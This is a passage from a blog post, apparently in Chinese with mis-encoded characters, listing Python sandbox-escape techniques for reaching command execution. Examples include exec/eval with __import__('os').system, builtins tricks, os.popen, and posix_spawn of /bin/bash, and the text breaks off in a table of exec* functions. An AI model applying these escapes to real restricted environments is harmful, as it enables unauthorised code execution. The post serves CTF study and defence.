<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/08/12/python æ²™ç®±é€ƒé€¸/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Python æ²™ç®±é€ƒé€¸ | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"æ¨èé˜…è¯»","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["ä¹¦æœ‰æœªæ›¾ç»æˆ‘è¯»ï¼Œäº‹æ— ä¸å¯å¯¹äººè¨€"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"åˆ†ç±»":{"icon":"fa-solid fa-folder","path":"/categories/"},"æ ‡ç­¾":{"icon":"fa-solid fa-tags","path":"/tags/"},"ä¹¦ç­¾":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    åˆ†ç±»
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    æ ‡ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    ä¹¦ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                åˆ†ç±»
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                æ ‡ç­¾
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                ä¹¦ç­¾
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">47</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Python æ²™ç®±é€ƒé€¸</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-12 00:01:08</span>
        <span class="mobile">2025-08-12 00:01:08</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-12 00:01:06</span>
            <span class="mobile">2025-08-12 00:01:06</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/python-web/">python web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/python-web/">python web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>8.5k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>37 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="é€ƒé€¸ç›®æ ‡"><a href="#é€ƒé€¸ç›®æ ‡" class="headerlink" title="é€ƒé€¸ç›®æ ‡"></a>é€ƒé€¸ç›®æ ‡</h1><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="builtin-æ¨¡å—"><a href="#builtin-æ¨¡å—" class="headerlink" title="builtin æ¨¡å—"></a>builtin æ¨¡å—</h3><table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>å¤šè¡Œæ”¯æŒ</th>
<th>è¿”å›å€¼</th>
</tr>
</thead>
<tbody><tr>
<td><code>exec(code)</code></td>
<td>âœ…</td>
<td><code>None</code></td>
</tr>
<tr>
<td><code>eval(expr)</code></td>
<td>âŒ</td>
<td>è®¡ç®—ç»“æœ</td>
</tr>
<tr>
<td><code>eval(compile(code,&quot;exec&quot;))</code></td>
<td>âœ…</td>
<td><code>None</code></td>
</tr>
</tbody></table>
<h4 id="execï¼ˆæ‰§è¡Œ-Python-ä»£ç å­—ç¬¦ä¸²ï¼‰"><a href="#execï¼ˆæ‰§è¡Œ-Python-ä»£ç å­—ç¬¦ä¸²ï¼‰" class="headerlink" title="execï¼ˆæ‰§è¡Œ Python ä»£ç å­—ç¬¦ä¸²ï¼‰"></a><code>exec</code>ï¼ˆæ‰§è¡Œ Python ä»£ç å­—ç¬¦ä¸²ï¼‰</h4><p>æ”¯æŒå¤šè¡Œä»£ç ï¼Œæ‰§è¡Œç»“æœæ˜¯ <code>None</code>ï¼ˆæ— è¿”å›å€¼ï¼‰ï¼Œè¿è¡Œç¯å¢ƒé»˜è®¤æ˜¯å½“å‰å…¨å±€&#x2F;å±€éƒ¨ä½œç”¨åŸŸã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå¯ä»¥é€šè¿‡ <code>builtins</code> æ¨¡å—é—´æ¥è°ƒç”¨ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>.__self__.<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="evalï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰"><a href="#evalï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰" class="headerlink" title="evalï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰"></a><code>eval</code>ï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰</h4><p>åªèƒ½æ‰§è¡Œ<strong>å•ä¸ªè¡¨è¾¾å¼</strong>ï¼ˆä¸èƒ½ç›´æ¥å¤šè¡Œã€ä¸èƒ½ç›´æ¥èµ‹å€¼è¯­å¥ç­‰ï¼‰,è¿”å›è¡¨è¾¾å¼è®¡ç®—ç»“æœã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p><code>eval</code> æ— æ³•ç›´æ¥è¾¾åˆ°æ‰§è¡Œå¤šè¡Œä»£ç çš„æ•ˆæœï¼Œä½¿ç”¨ <code>compile</code> å‡½æ•°å¹¶ä¼ å…¥ <code>exec</code> æ¨¡å¼å°±èƒ½å¤Ÿå®ç°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>Python å†…ç½®å‡½æ•° <code>compile(source, filename, mode)</code> ä¼šæŠŠ <strong>æºç å­—ç¬¦ä¸²</strong> ç¼–è¯‘æˆ <strong>å¯æ‰§è¡Œçš„ä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰</strong>ã€‚</p>
<ul>
<li><strong><code>source</code></strong> ï¼šè¦ç¼–è¯‘çš„ Python ä»£ç ï¼ˆå­—ç¬¦ä¸²ã€AST ç­‰ï¼‰</li>
<li><strong><code>filename</code></strong> ï¼šä»£ç æ¥æºåå­—ï¼ˆç»™è°ƒè¯•å™¨&#x2F;å¼‚å¸¸ä¿¡æ¯ç”¨ï¼Œéšä¾¿å†™ï¼Œæ¯”å¦‚ <code>&lt;string&gt;</code>ã€<code>&lt;payload&gt;</code>ï¼‰</li>
<li><strong><code>mode</code></strong> ï¼š<ul>
<li><code>&#39;exec&#39;</code> â†’ æ‰§è¡Œæ¨¡å¼ï¼Œå¯åŒ…å«å¤šè¡Œè¯­å¥ï¼ˆ<code>for</code>ã€<code>def</code>ã€<code>import</code> ç­‰ï¼‰</li>
<li><code>&#39;eval&#39;</code> â†’ è¡¨è¾¾å¼æ¨¡å¼ï¼Œåªå…è®¸å•ä¸ªè¡¨è¾¾å¼</li>
<li><code>&#39;single&#39;</code> â†’ å•è¡Œæ¨¡å¼ï¼Œäº¤äº’å¼æ‰§è¡Œï¼ˆä¼šå›æ˜¾ï¼‰</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="os-æ¨¡å—"><a href="#os-æ¨¡å—" class="headerlink" title="os æ¨¡å—"></a>os æ¨¡å—</h3><table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>æ˜¯å¦èµ° Shell</th>
<th>æ˜¯å¦è¿”å›ç»“æœ</th>
<th>æ˜¯å¦æ›¿æ¢å½“å‰è¿›ç¨‹</th>
<th>æ˜¯å¦å¯ä¼ ç¯å¢ƒå˜é‡</th>
</tr>
</thead>
<tbody><tr>
<td><code>os.system</code></td>
<td>âœ…</td>
<td>âŒï¼ˆè¿”å›ç ï¼‰</td>
<td>âŒ</td>
<td>é—´æ¥ï¼ˆä¾èµ– shellï¼‰</td>
</tr>
<tr>
<td><code>os.popen</code></td>
<td>âœ…</td>
<td>âœ…ï¼ˆè¾“å‡ºï¼‰</td>
<td>âŒ</td>
<td>é—´æ¥ï¼ˆä¾èµ– shellï¼‰</td>
</tr>
<tr>
<td><code>posix_spawn</code></td>
<td>âŒ</td>
<td>âŒ</td>
<td>âŒ</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>spawnv</code></td>
<td>âŒ</td>
<td>âŒ</td>
<td>âŒ</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>exec*</code> ç³»åˆ—</td>
<td>âŒ&#x2F;PATH å¯é€‰</td>
<td>âŒ</td>
<td>âœ…</td>
<td>éƒ¨åˆ†æ”¯æŒï¼ˆå¸¦ e çš„ï¼‰</td>
</tr>
<tr>
<td><code>fork</code>+cmd</td>
<td>å¯é€‰</td>
<td>å¯é€‰</td>
<td>âŒ</td>
<td>å¯é€‰</td>
</tr>
</tbody></table>
<h4 id="system-popen-ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰"><a href="#system-popen-ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰" class="headerlink" title="system &#x2F; popen ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰"></a><code>system</code> &#x2F; <code>popen</code> ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰</h4><p>ç›´æ¥é€šè¿‡ shell æ‰§è¡Œå‘½ä»¤ï¼Œç»“æœè¿”å›ç æˆ–è¾“å‡ºå†…å®¹ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)                                <span class="comment"># æ‰§è¡Œå‘½ä»¤ï¼Œè¿”å› exit code</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)                  <span class="comment"># åŠ¨æ€å¯¼å…¥ç»•è¿‡</span></span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()                           <span class="comment"># æ‰§è¡Œå‘½ä»¤å¹¶è¯»å–è¾“å‡º</span></span><br></pre></td></tr></table></figure></div>

<p>âš ï¸ <code>system</code> ä¼šå¯åŠ¨ä¸€ä¸ª shellï¼ˆsh&#x2F;bashï¼‰ï¼Œ<code>popen</code> è¿˜èƒ½ç›´æ¥æ•è·è¾“å‡ºã€‚</p>
<h4 id="spawn-posix-spawn-ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰"><a href="#spawn-posix-spawn-ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰" class="headerlink" title="spawn &#x2F; posix_spawn ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰"></a><code>spawn</code> &#x2F; <code>posix_spawn</code> ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰</h4><p>ç›´æ¥æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä¼ å‚æ•°å’Œç¯å¢ƒå˜é‡ï¼Œä¾èµ– <code>execve</code>ã€‚ä¸èµ° shellï¼Œç›´æ¥è¿è¡ŒäºŒè¿›åˆ¶ã€‚å¸¸ç”¨äºä¸æƒ³ä¾èµ– shell è§£æçš„åœºæ™¯ï¼ˆç»•è¿‡æŸäº›å­—ç¬¦è¿‡æ»¤ï¼‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os.posix_spawn(<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>], os.environ)</span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/bash&quot;</span>, [<span class="string">&quot;/bin/bash&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.spawnv(<span class="number">0</span>, <span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>])</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>posix_spawn</code> â†’ <strong>åªæœ‰ç±» Unix ç³»ç»Ÿ</strong>å¯ç”¨ï¼ŒWindows ä¼šç›´æ¥ <code>AttributeError</code>ã€‚</li>
<li><code>spawnv</code> â†’ Windows å’Œç±» Unix éƒ½èƒ½ç”¨ï¼Œä½†æ‰§è¡Œè¡Œä¸ºä¼šè·Ÿå¹³å°ç›¸å…³ã€‚</li>
</ul>
<h4 id="exec-ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰"><a href="#exec-ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰" class="headerlink" title="exec* ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰"></a><code>exec*</code> ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰</h4><p>ç›´æ¥æ›¿æ¢å½“å‰ Python è¿›ç¨‹ä¸ºç›®æ ‡ç¨‹åºï¼ˆæ‰§è¡Œå Python ä¸ä¼šè¿”å›ï¼‰ã€‚</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>è·¯å¾„æ–¹å¼</th>
<th>ä¼ å‚æ–¹å¼</th>
<th>ç¯å¢ƒå˜é‡æŒ‡å®š</th>
<th>PATH æœç´¢</th>
</tr>
</thead>
<tbody><tr>
<td><code>execl</code></td>
<td>ç»å¯¹è·¯å¾„</td>
<td>åˆ†æ•£å‚æ•°</td>
<td>âŒ</td>
<td>âŒ</td>
</tr>
<tr>
<td><code>execle</code></td>
<td>ç»å¯¹è·¯å¾„</td>
<td>åˆ†æ•£å‚æ•°</td>
<td>âœ…</td>
<td>âŒ</td>
</tr>
<tr>
<td><code>execlp</code></td>
<td>ç¨‹åºå</td>
<td>åˆ†æ•£å‚æ•°</td>
<td>âŒ</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>execlpe</code></td>
<td>ç¨‹åºå</td>
<td>åˆ†æ•£å‚æ•°</td>
<td>âœ…</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>execv</code></td>
<td>ç»å¯¹è·¯å¾„</td>
<td>åˆ—è¡¨å‚æ•°</td>
<td>âŒ</td>
<td>âŒ</td>
</tr>
<tr>
<td><code>execve</code></td>
<td>ç»å¯¹è·¯å¾„</td>
<td>åˆ—è¡¨å‚æ•°</td>
<td>âœ…</td>
